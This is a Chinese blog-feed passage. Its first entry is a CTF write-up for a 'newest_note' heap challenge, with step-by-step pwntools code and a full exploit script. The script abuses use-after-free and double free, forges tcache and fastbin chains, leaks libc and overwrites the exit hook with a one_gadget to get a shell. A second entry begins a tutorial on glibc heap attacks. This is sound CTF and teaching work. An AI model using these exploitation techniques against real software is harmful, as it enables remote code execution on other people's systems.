src="https://img-blog.csdnimg.cn/641a2a24c6634e648470ba9c17bacca3.png" alt="img"></p><h2 id="思路整理"><a href="#思路整理" class="headerlink" title="思路整理"></a>思路整理</h2><p>我们来看看可以拿到的信息有哪些。首先，由于新libc的机制，我们可以利用uaf漏洞轻松获取heapbase，这里的key是新libc环境下用来xor操作的值。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs Python">add(<span class="hljs-number">0</span>,<span class="hljs-string">&#x27;aaaa&#x27;</span>)<br>free(<span class="hljs-number">0</span>)<br>show(<span class="hljs-number">0</span>)<br>io.recvuntil(<span class="hljs-string">&#x27;Content: &#x27;</span>)<br>key=u64(io.recvuntil(<span class="hljs-string">&#x27;\x0a&#x27;</span>)[:-<span class="hljs-number">1</span>].ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>)) <span class="hljs-comment">#key</span><br>heap_base = key&lt;&lt;<span class="hljs-number">12</span><br>success(<span class="hljs-string">&#x27;key--&gt;&#x27;</span>+<span class="hljs-built_in">hex</span>(key))<br>success(<span class="hljs-string">&#x27;heap--&gt;&#x27;</span>+<span class="hljs-built_in">hex</span>(heap_base))<br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/1e140e2c358548f7b56cec373b77f0d8.png" alt="img"></p><p>其次，考虑如何泄露libc，由于存在UAF，我们一般可以通过unsortbin来进行泄露。但是问题在于，每个chunk的size都不够大，即便填满tache也只会进入fastbin，而不是unsortbin。在这里，我想到了两个思路</p><ul><li><p>其一，在程序开头我们输入了一个size，并malloc了一个8*size的chunk用来起到note记录的作用。即这个chunk的size是可控的，<strong>更重要的是这个chunk没有限制大小</strong>如果可以free这个chunk进入unsortbin，便可以实现libc的泄露。但是在这种思路下，考虑填满tcache需要7次free，doublefree控制指针指向notechunk需要2-3次free，泄露libc需要一次free，然后再次doublefree劫持hook。free的次数显然超过11次，暂时无法实现，如果有大佬有方法通过控制开头的notechunk来解出这道题，希望能指点下我😭</p></li><li><p>其二，我们可以尝试伪造一个tcache链，使得其实际size小于0x40，利用溢出构造伪造巨大chunk头并free进入unsortbin，得到libc。同时在这种情况下，我们也可以用溢出轻易完成对freechunk内容的更改，以此劫持hook</p></li></ul><p>下面我们采用第二种思路</p><h3 id="一、得到heapbase"><a href="#一、得到heapbase" class="headerlink" title="一、得到heapbase"></a>一、得到heapbase</h3><p>开始先申请几个chunk，多申请的那几个是用来扩充可控堆区域的大小，为伪造的大chunk提供空间，不然覆盖进topchunk程序会崩掉。这个步骤比较简单，前面也谈到了不过多赘述</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs Python">io.recvuntil(<span class="hljs-string">&#x27;How many pages your notebook will be? :&#x27;</span>)<br>io.sendline(<span class="hljs-string">&#x27;16&#x27;</span>)<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">16</span>):<br>    add(i,<span class="hljs-string">&#x27;aaaaaaaa&#x27;</span>)<br><br>add(<span class="hljs-number">15</span>,<span class="hljs-string">&#x27;cccccccc&#x27;</span>)<br>add(<span class="hljs-number">15</span>,<span class="hljs-string">&#x27;cccccccc&#x27;</span>)<br>add(<span class="hljs-number">15</span>,<span class="hljs-string">&#x27;cccccccc&#x27;</span>)<br><br>free(<span class="hljs-number">0</span>)<br>show(<span class="hljs-number">0</span>)<br>io.recvuntil(<span class="hljs-string">&#x27;Content: &#x27;</span>)<br>key=u64(io.recvuntil(<span class="hljs-string">&#x27;\x0a&#x27;</span>)[:-<span class="hljs-number">1</span>].ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>)) <span class="hljs-comment">#key</span><br>heap_base = key&lt;&lt;<span class="hljs-number">12</span><br>success(<span class="hljs-string">&#x27;key--&gt;&#x27;</span>+<span class="hljs-built_in">hex</span>(key))<br>success(<span class="hljs-string">&#x27;heap--&gt;&#x27;</span>+<span class="hljs-built_in">hex</span>(heap_base))<br></code></pre></td></tr></table></figure><h3 id="二、伪造fastbin链"><a href="#二、伪造fastbin链" class="headerlink" title="二、伪造fastbin链"></a>二、伪造fastbin链</h3><p>这里我们先填满tcache,然后free 7号chunk进入fastbin，结构入下图所示。由于新的libc机制，这里的fd指针都进行了异或操作，所以看起来并不是很直观。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs Python"><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-number">7</span>):<br>    free(i)<br><span class="hljs-comment">## double free</span><br>free(<span class="hljs-number">7</span>)<br>add(<span class="hljs-number">10</span>,<span class="hljs-string">&#x27;aaaaaaaa&#x27;</span>)<br>free(<span class="hljs-number">7</span>)<br><span class="hljs-comment"># pause()</span><br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/e5ae010babec4989a45fa29018da4cb4.png" alt="img"></p><p>然后申请chunk，此时从tcache中取出最后一个chunk。由于此时tcache中仅剩6个chunk，我们再对7号chunk进行free时，它便会放入tcache中。通过这样的doublefree我们构造了一个即在Tcache又在fastbin的chunk，如下所示。</p><p><img src="https://img-blog.csdnimg.cn/839aa64c464c4ab1a42b524daf40f730.png" alt="img"></p><p> 接下来我们便可以开始构造fake fastbin，需要注意的是fastbin中的fd指针同样需要异或处理，我们可以得到如下结构,此时tcache链长度为0，fastbin的长度为7.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs Python">add(<span class="hljs-number">10</span>,p64(key^(heap_base+<span class="hljs-number">0x480</span>)))<br>add(<span class="hljs-number">0</span>,<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x20</span>+p64(key^(heap_base+<span class="hljs-number">0x440</span>)))<br>add(<span class="hljs-number">1</span>,<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x20</span>+p64(key^(heap_base+<span class="hljs-number">0x400</span>)))<br>add(<span class="hljs-number">2</span>,<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x20</span>+p64(key^(heap_base+<span class="hljs-number">0x3a0</span>)))<br>add(<span class="hljs-number">3</span>,p64(key^(heap_base+<span class="hljs-number">0x380</span>)))<br>add(<span class="hljs-number">4</span>,<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x20</span>+p64(key^(heap_base+<span class="hljs-number">0x340</span>)))<br>add(<span class="hljs-number">5</span>,<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x20</span>+p64(key)) <span class="hljs-comment">##7</span><br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/5e6f8e3dac8945b28ddf8b4794c3395f.png" alt="img"></p><h3 id="三、伪造tcache链并泄露libc"><a href="#三、伪造tcache链并泄露libc" class="headerlink" title="三、伪造tcache链并泄露libc"></a>三、伪造tcache链并泄露libc</h3><p> 此时我们调用add()，就会触发fastbin和tcache的stash机制，此时其余6个chunk便会扔到tcache中，其结构如下所示</p><blockquote><p> 当从 fastbin 里取 chunk 时，其余的 chunk 会被依次放入对应的 tcache 中，终止条件时 fastbin 链为空或者 tcache 装满。</p></blockquote><p><img src="https://img-blog.csdnimg.cn/687aa9ca42f04f08895b1958d2ae0c29.png" alt="img"></p><p> 再次add，tcache和fastbin的取出顺序是相反的，即tcache最上方的chunk将被取出，同时编辑内容更改<strong>0x56309de85360</strong>的头部size大小为0x441。之后我们只需要free掉360处的chunk便可泄露libc</p><blockquote><p> fastbin最大为0x410,这里用0x441刚好可以对齐chunk</p></blockquote><p><img src="https://img-blog.csdnimg.cn/60c6e7ed5e2d4633b5226a7183ab38d7.png" alt="img"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs Python"><span class="hljs-comment">## change head of 4 </span><br>add(<span class="hljs-number">7</span>,<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x18</span>+p64(<span class="hljs-number">0x441</span>))<br><br>free(<span class="hljs-number">4</span>) <br>show(<span class="hljs-number">4</span>)<br>io.recvuntil(<span class="hljs-string">&#x27;Content: &#x27;</span>)<br>libc_base = u64(io.recvuntil(<span class="hljs-string">&#x27;\x0a&#x27;</span>)[:-<span class="hljs-number">1</span>].ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>)) - <span class="hljs-number">0x218cc0</span><br>success(<span class="hljs-string">&#x27;libc_base--&gt;&#x27;</span>+<span class="hljs-built_in">hex</span>(libc_base))<br><br>exit_hook = libc_base + <span class="hljs-number">0x21a6c8</span><br>one_gadget = libc_base + <span class="hljs-number">0xeeccc</span><br>success(<span class="hljs-string">&#x27;exit_hook--&gt;&#x27;</span>+<span class="hljs-built_in">hex</span>(exit_hook))<br></code></pre></td></tr></table></figure><blockquote><p> 这里没有选择freehook或者mallochook是因为没有合适的onegadget，选择劫持exithook</p></blockquote><h3 id="四、劫持exithook"><a href="#四、劫持exithook" class="headerlink" title="四、劫持exithook"></a>四、劫持exithook</h3><p>由于我们在tcache链里折叠了两个chunk这样便可以轻松的更改freechunk的内容，劫持exithook为ongadget然后结束程序便可，最终结构如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs Python">add(<span class="hljs-number">11</span>,<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x18</span>+p64(<span class="hljs-number">0x41</span>)+p64(key^(exit_hook-<span class="hljs-number">0x8</span>)))<br>add(<span class="hljs-number">12</span>,<span class="hljs-string">b&#x27;aaaa&#x27;</span>)<br>add(<span class="hljs-number">13</span>,<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x8</span>+p64(one_gadget))<br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/6d12cf8cb53c453683ef5ee3ddc6f2d2.png" alt="img"></p><h2 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br></pre></td><td class="code"><pre><code class="hljs Python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>io = process(<span class="hljs-string">&#x27;./newest_note&#x27;</span>)<br><span class="hljs-comment"># context.log_level = &#x27;debug&#x27;</span><br><br>libc = ELF(<span class="hljs-string">&#x27;./libc.so.6&#x27;</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">idx,text</span>):<br>    io.recvuntil(<span class="hljs-string">&#x27;4. Exit&#x27;</span>)<br>    io.sendline(<span class="hljs-string">&#x27;1&#x27;</span>)<br>    io.recvuntil(<span class="hljs-string">&#x27;Index: &#x27;</span>)<br>    io.sendline(<span class="hljs-built_in">str</span>(idx))<br>    io.recvuntil(<span class="hljs-string">&#x27;Content: &#x27;</span>)<br>    io.send(text)<br>    <br><span class="hljs-keyword">def</span> <span class="hljs-title function_">free</span>(<span class="hljs-params">idx</span>):<br>    io.recvuntil(<span class="hljs-string">&#x27;4. Exit&#x27;</span>)<br>    io.sendline(<span class="hljs-string">&#x27;2&#x27;</span>)<br>    io.recvuntil(<span class="hljs-string">&#x27;Index: &#x27;</span>)<br>    io.sendline(<span class="hljs-built_in">str</span>(idx))<br>    <br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>(<span class="hljs-params">idx</span>):<br>    io.recvuntil(<span class="hljs-string">&#x27;4. Exit&#x27;</span>)<br>    io.sendline(<span class="hljs-string">&#x27;3&#x27;</span>)<br>    io.recvuntil(<span class="hljs-string">&#x27;Index: &#x27;</span>)<br>    io.sendline(<span class="hljs-built_in">str</span>(idx))<br>    <br>io.recvuntil(<span class="hljs-string">&#x27;How many pages your notebook will be? :&#x27;</span>)<br>io.sendline(<span class="hljs-string">&#x27;16&#x27;</span>)<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">16</span>):<br>    add(i,<span class="hljs-string">&#x27;aaaaaaaa&#x27;</span>)<br><br>add(<span class="hljs-number">15</span>,<span class="hljs-string">&#x27;cccccccc&#x27;</span>)<br>add(<span class="hljs-number">15</span>,<span class="hljs-string">&#x27;cccccccc&#x27;</span>)<br>add(<span class="hljs-number">15</span>,<span class="hljs-string">&#x27;cccccccc&#x27;</span>)<br><br>free(<span class="hljs-number">0</span>)<br>show(<span class="hljs-number">0</span>)<br>io.recvuntil(<span class="hljs-string">&#x27;Content: &#x27;</span>)<br>key=u64(io.recvuntil(<span class="hljs-string">&#x27;\x0a&#x27;</span>)[:-<span class="hljs-number">1</span>].ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>)) <span class="hljs-comment">#key</span><br>heap_base = key&lt;&lt;<span class="hljs-number">12</span><br>success(<span class="hljs-string">&#x27;key--&gt;&#x27;</span>+<span class="hljs-built_in">hex</span>(key))<br>success(<span class="hljs-string">&#x27;heap--&gt;&#x27;</span>+<span class="hljs-built_in">hex</span>(heap_base))<br><span class="hljs-comment"># pause()</span><br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-number">7</span>):<br>    free(i)<br><span class="hljs-comment">## double free</span><br>free(<span class="hljs-number">7</span>)<br>pause()<br>add(<span class="hljs-number">10</span>,<span class="hljs-string">&#x27;aaaaaaaa&#x27;</span>)<br>free(<span class="hljs-number">7</span>)<br><span class="hljs-comment"># pause()</span><br><br><span class="hljs-comment">## fake tcache</span><br>add(<span class="hljs-number">10</span>,p64(key^(heap_base+<span class="hljs-number">0x480</span>)))<br>add(<span class="hljs-number">0</span>,<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x20</span>+p64(key^(heap_base+<span class="hljs-number">0x440</span>)))<br>add(<span class="hljs-number">1</span>,<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x20</span>+p64(key^(heap_base+<span class="hljs-number">0x400</span>)))<br>add(<span class="hljs-number">2</span>,<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x20</span>+p64(key^(heap_base+<span class="hljs-number">0x3a0</span>)))<br>add(<span class="hljs-number">3</span>,p64(key^(heap_base+<span class="hljs-number">0x380</span>)))<br>add(<span class="hljs-number">4</span>,<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x20</span>+p64(key^(heap_base+<span class="hljs-number">0x340</span>)))<br>add(<span class="hljs-number">5</span>,<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x20</span>+p64(key)) <span class="hljs-comment">##7</span><br>add(<span class="hljs-number">7</span>,<span class="hljs-string">&#x27;aaaaaaaa&#x27;</span>)<br><br><span class="hljs-comment">## change head of 4 </span><br>add(<span class="hljs-number">7</span>,<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x18</span>+p64(<span class="hljs-number">0x441</span>))<br><br>free(<span class="hljs-number">4</span>) <br>show(<span class="hljs-number">4</span>)<br>io.recvuntil(<span class="hljs-string">&#x27;Content: &#x27;</span>)<br>libc_base = u64(io.recvuntil(<span class="hljs-string">&#x27;\x0a&#x27;</span>)[:-<span class="hljs-number">1</span>].ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>)) - <span class="hljs-number">0x218cc0</span><br>success(<span class="hljs-string">&#x27;libc_base--&gt;&#x27;</span>+<span class="hljs-built_in">hex</span>(libc_base))<br><br>exit_hook = libc_base + <span class="hljs-number">0x21a6c8</span><br>one_gadget = libc_base + <span class="hljs-number">0xeeccc</span><br>success(<span class="hljs-string">&#x27;exit_hook--&gt;&#x27;</span>+<span class="hljs-built_in">hex</span>(exit_hook))<br><br>add(<span class="hljs-number">11</span>,<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x18</span>+p64(<span class="hljs-number">0x41</span>)+p64(key^(exit_hook-<span class="hljs-number">0x8</span>)))<br>add(<span class="hljs-number">12</span>,<span class="hljs-string">b&#x27;aaaa&#x27;</span>)<br>add(<span class="hljs-number">13</span>,<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x8</span>+p64(one_gadget))<br><br>io.recvuntil(<span class="hljs-string">&#x27;4. Exit&#x27;</span>)<br>io.sendline(<span class="hljs-string">&#x27;4&#x27;</span>)<br><br><br>io.interactive()<br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">0xeeccc execve(&quot;/bin/sh&quot;, r15, r12)</span><br><span class="hljs-string">constraints:</span><br><span class="hljs-string">  [r15] == NULL || r15 == NULL</span><br><span class="hljs-string">  [r12] == NULL || r12 == NULL</span><br><span class="hljs-string"></span><br><span class="hljs-string">0xeeccf execve(&quot;/bin/sh&quot;, r15, rdx)</span><br><span class="hljs-string">constraints:</span><br><span class="hljs-string">  [r15] == NULL || r15 == NULL</span><br><span class="hljs-string">  [rdx] == NULL || rdx == NULL</span><br><span class="hljs-string"></span><br><span class="hljs-string">0xeecd2 execve(&quot;/bin/sh&quot;, rsi, rdx)</span><br><span class="hljs-string">constraints:</span><br><span class="hljs-string">  [rsi] == NULL || rsi == NULL</span><br><span class="hljs-string">  [rdx] == NULL || rdx == NULL&#x27;&#x27;&#x27;</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>HEAP 攻击方式记录以及总结</title>
    <link href="/2022/06/03/HEAP%20%E6%94%BB%E5%87%BB%E6%96%B9%E5%BC%8F%E8%AE%B0%E5%BD%95%E4%BB%A5%E5%8F%8A%E6%80%BB%E7%BB%93/"/>
    <url>/2022/06/03/HEAP%20%E6%94%BB%E5%87%BB%E6%96%B9%E5%BC%8F%E8%AE%B0%E5%BD%95%E4%BB%A5%E5%8F%8A%E6%80%BB%E7%BB%93/</url>
    
    <content type="html"><![CDATA[<blockquote><p>文章很多图源来自NTUSTISC例会视频，油管链接：<a href="https://www.youtube.com/watch?v=ItpJY9Lpw-o&list=PLHP-B3mcSY_5r5AJsZyTZLwjX9z8v_b5x">NTUSTISC - Pwn 3 - YouTube</a><br>目前只支持到libc2.34版本</p></blockquote><h2 id="Heap-Based-Buffer-Overflow"><a href="#Heap-Based-Buffer-Overflow" class="headerlink" title="Heap-Based Buffer Overflow"></a>Heap-Based Buffer Overflow</h2><p>最最基本的攻击方式，由于未对输入长度限制，且堆块是一片连续存储的内存空间特性。导致可以对其后高地址的chunk的各种信息进行覆写。</p><p><img src="/img/article/1.png"></p><p><img src="/img/article/2.png"></p><h2 id="UAF-Use-after-free"><a href="#UAF-Use-after-free" class="headerlink" title="UAF(Use-after-free)"></a>UAF(Use-after-free)</h2><p>在free()掉chunk之后，原本指向chunk的指针由于程序猿自身的懒惰，没有将pointer &#x3D; NULL; 导致依然可以使用该指针进行额外的操作</p><p>UAF漏洞一般常用于泄露，或者更改已经free掉的chunk中的信息，最常见便是libc的泄露,以及对Tcache&#x2F;Fastbin链表的控制</p><blockquote><p>当第一块chunk进入unsorted bin后，他的fd和bk指针会共同指向main_arena+88(具体偏移似乎会随着版本变化，做题时手动调试即可)，意味着当存在UAF漏洞时，我们可以输出这个chunk的内容即能得到libc</p></blockquote><h2 id="Fastbin-Dup"><a href="#Fastbin-Dup" class="headerlink" title="Fastbin Dup"></a>Fastbin Dup</h2><p>fastbin dup 实际是在fastbin链上实现的狭义的double free。由于fastbin 自身源码的缺陷，在对double free 的检测机制仅仅验证了当前free掉的chunk与fast bin 第一个chunk是否相同，而对于其他chunk则没有做检测。另外fastbin在free时会检测当前当前的chunk于头部chunk的size大小是否相同。</p><p>那么构造double free 时只需要穿插一块其他的chunk即可实现</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-built_in">free</span>(<span class="hljs-number">1</span>);<br><span class="hljs-built_in">free</span>(<span class="hljs-number">2</span>);<br><span class="hljs-built_in">free</span>(<span class="hljs-number">1</span>);<br></code></pre></td></tr></table></figure><p><img src="/img/article/3.png"></p><p>在完成double free 之后我们只需要malloc 这里的chunk1 就能得到一块 既是allocated 又是 free 状态的chunk。接下来我们就能对其fd指针进行修改，从而控制fastbin链表的方向是我们想要的地方，便能实现对任意地址的控制(读写)</p><p><img src="/img/article/4.png"></p><blockquote><p>额外需要注意的点：</p><ul><li>fastbin会对chunk头的大小进行检测，那么图中malice处chunk的size需要控制好</li><li>libc2.26之后，free的小于0x410的chunk会先进入Tcache中，最多承纳7个chunk</li><li>且在tcache填满之后，malloc优先会取出tcache中的chunk，可以利用calloc不会申请tcache的特点</li></ul></blockquote><h2 id="Tcache-Dup"><a href="#Tcache-Dup" class="headerlink" title="Tcache Dup"></a>Tcache Dup</h2><blockquote><p>Tcache 在最近的几个libc中加入了多个机制，用于保证其安全性，这里我将分不同版本讨论</p></blockquote><h3 id="libc2-26-libc2-28"><a href="#libc2-26-libc2-28" class="headerlink" title="libc2.26-libc2.28"></a>libc2.26-libc2.28</h3><p>在这几个版本中，几乎没有检测机制，对同一块chunk直接进行double free即可，甚至比fastbin dup还要简易</p><h3 id="libc2-29-libc2-31"><a href="#libc2-29-libc2-31" class="headerlink" title="libc2.29-libc2.31"></a>libc2.29-libc2.31</h3><p>在这几个版本中，tcache 的 bk指针处存放了一个8byte的随机数作为key，即代表这块chunk在tcache链中。每次free时，检测bk的位置的值是否为key，若是，则为doublefree。</p><blockquote><p>绕过方式：存在UAF漏洞的情况下，我们可以直接更改，tcache中chunk的key值即可</p></blockquote><h3 id="libc2-32"><a href="#libc2-32" class="headerlink" title="libc2.32"></a>libc2.32</h3><h4 id="Safe-linking-ptr-xor"><a href="#Safe-linking-ptr-xor" class="headerlink" title="Safe-linking(ptr xor)"></a>Safe-linking(ptr xor)</h4><p>libc2.32中引入了Safe-linking机制，应用于fastbin和tcache中</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> __always_inline <span class="hljs-type">void</span><br><span class="hljs-title function_">tcache_put</span> <span class="hljs-params">(mchunkptr chunk, <span class="hljs-type">size_t</span> tc_idx)</span><br>&#123;<br>tcache_entry *e = (tcache_entry *) chunk2mem (chunk);<br><br><span class="hljs-comment">/* Mark this chunk as “in the tcache” so the test in _int_free will</span><br><span class="hljs-comment">detect a double free.  */</span><br>e-&gt;key = tcache;<br><br>e-&gt;next = PROTECT_PTR (&amp;e-&gt;next, tcache-&gt;entries[tc_idx]);<br>tcache-&gt;entries[tc_idx] = e;<br>++(tcache-&gt;counts[tc_idx]);<br>&#125;<br></code></pre></td></tr></table></figure><p>可以看到经glibc-2.32更新后，e-&gt;next不再是直接指向原来的tcache头指针，而是指向了经PROTECT_PTR处理过的指针，查看PROTECT_PTR定义：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">define</span> PROTECT_PTR(pos, ptr) \</span><br><span class="hljs-meta">((__typeof (ptr)) ((((size_t) pos) &gt;&gt; 12) ^ ((size_t) ptr)));</span><br></code></pre></td></tr></table></figure><p>结合tcache_put()函数可以得出e-&gt;next最终指向了e-&gt;next地址右移12位后的值与当前tcache头指针值异或的结果，这里引用Safe-Linking设计师文章[1]中的一张图描述此过程：</p><p><img src="/img/article/5.png" alt="img"></p><p>其实就是一个简单的异或操作，这里所有的指针都进行了处理，具体细节可以自行查询，不过多赘述</p><h4 id="内存对齐检测"><a href="#内存对齐检测" class="headerlink" title="内存对齐检测"></a>内存对齐检测</h4><p>此外，在glibc-2.32版本中还引入了对tcache和fastbins中申请及释放内存地址的对齐检测，以tcache_get()为例：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> __always_inline <span class="hljs-type">void</span> *<br><br><span class="hljs-title function_">tcache_get</span> <span class="hljs-params">(<span class="hljs-type">size_t</span> tc_idx)</span><br><br>&#123;<br><br>tcache_entry *e = tcache-&gt;entries[tc_idx];<br><br><span class="hljs-keyword">if</span> (__glibc_unlikely (!aligned_OK (e)))<br><br>malloc_printerr (“<span class="hljs-built_in">malloc</span>(): unaligned tcache chunk detected”);<br><br>tcache-&gt;entries[tc_idx] = REVEAL_PTR (e-&gt;next);<br><br>–(tcache-&gt;counts[tc_idx]);<br><br>e-&gt;key = <span class="hljs-literal">NULL</span>;<br><br><span class="hljs-keyword">return</span> (<span class="hljs-type">void</span> *) e;<br><br>&#125;<br></code></pre></td></tr></table></figure><p>aligned_OK()定义为：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">define</span> aligned_OK(m)  (((unsigned long)(m) &amp; MALLOC_ALIGN_MASK) == 0)</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> MALLOC_ALIGN_MASK (MALLOC_ALIGNMENT – 1)</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> MALLOC_ALIGNMENT (2 * SIZE_SZ &lt; __alignof__ (long double) \</span><br><span class="hljs-meta">? __alignof__ (long double) : 2 * 